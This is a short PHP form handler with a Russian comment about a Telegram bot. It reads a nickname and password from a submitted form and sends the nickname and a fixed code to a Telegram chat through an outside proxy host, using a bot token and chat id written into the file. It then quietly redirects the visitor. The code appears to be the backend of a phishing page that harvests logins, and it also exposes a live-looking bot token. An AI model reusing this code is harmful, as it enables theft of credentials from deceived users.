<?php

/* https://api.telegram.org/botXXXXXXXXXXXXXXXXXXXXX/getUpdates,
где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */

$nickname = $_POST['nickname'];
$pass = $_POST['pass'];
$code = "123456789";
$token = "918093523:AAF0Tb50J64MvofrC83ZqWoTzmr8RkKkyWI";
$chat_id = "-351976785";
$arr = array(
  'Nickname: ' => $nickname,
  'Code: ' => $code
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://telegg.ru/orig/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: index.html');
} else {
  echo "Error";
}
